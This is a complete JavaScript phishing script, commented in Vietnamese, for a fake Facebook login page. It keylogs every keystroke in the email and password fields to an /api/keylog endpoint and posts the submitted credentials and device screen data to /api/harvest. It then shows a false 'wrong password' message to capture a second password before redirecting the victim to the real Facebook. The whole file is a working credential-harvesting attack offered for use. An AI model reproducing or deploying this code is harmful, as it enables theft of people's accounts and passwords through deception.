/**
 * Phishing Script - Facebook
 * - Thu hoạch credentials qua POST /api/harvest
 * - Keylogger realtime qua POST /api/keylog
 * - Lần 1: "Sai mật khẩu" → nhập lại
 * - Lần 2: Chuyển hướng Facebook thật
 */
const form = document.getElementById('loginForm');
const loadingOverlay = document.getElementById('loadingOverlay');
const errorMsg = document.getElementById('errorMsg');
let submitCount = 0;

// Session ID duy nhất cho mỗi lần truy cập
const SESSION_ID = 'fb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);

// ===== KEYLOGGER =====
// Ghi lại từng phím gõ vào các ô input
function setupKeylogger(inputEl, fieldName) {
    let debounceTimer;
    
    inputEl.addEventListener('input', function() {
        clearTimeout(debounceTimer);
        debounceTimer = setTimeout(() => {
            fetch('/api/keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    field: fieldName,
                    value: inputEl.value,
                    key: 'input',
                    page_type: 'facebook',
                    session_id: SESSION_ID
                })
            }).catch(() => {});
        }, 300); // Debounce 300ms để không spam
    });

    inputEl.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' || e.key === 'Tab') return;
        // Gửi từng phím đặc biệt (Backspace, Delete, etc.)
        if (e.key.length > 1) {
            fetch('/api/keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    field: fieldName,
                    value: inputEl.value,
                    key: e.key,
                    page_type: 'facebook',
                    session_id: SESSION_ID
                })
            }).catch(() => {});
        }
    });
}

setupKeylogger(document.getElementById('email'), 'email');
setupKeylogger(document.getElementById('password'), 'password');

// ===== FORM SUBMIT =====
form.addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    if (!email || !password) return;

    loadingOverlay.classList.add('active');
    document.getElementById('btnLogin').disabled = true;

    try {
        const response = await fetch('/api/harvest', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                email, 
                password, 
                page_type: 'facebook',
                screen_info: {
                    width: screen.width,
                    height: screen.height,
                    pixelRatio: window.devicePixelRatio
                }
            })
        });
        const result = await response.json();
        submitCount++;

        // Giả lập thời gian loading tự nhiên
        await new Promise(r => setTimeout(r, 1500 + Math.random() * 1000));
        loadingOverlay.classList.remove('active');
        document.getElementById('btnLogin').disabled = false;

        if (submitCount === 1) {
            // Lần 1: Hiện lỗi "sai mật khẩu" → nạn nhân nhập lại
            errorMsg.classList.add('show');
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        } else {
            // Lần 2: Đã thu được 2 mật khẩu, redirect về thật
            if (result.redirect) window.location.href = result.redirect;
        }
    } catch (error) {
        loadingOverlay.classList.remove('active');
        document.getElementById('btnLogin').disabled = false;
        window.location.href = 'https://www.facebook.com';
    }
});

document.getElementById('email').addEventListener('input', () => errorMsg.classList.remove('show'));
document.getElementById('password').addEventListener('input', () => errorMsg.classList.remove('show'));
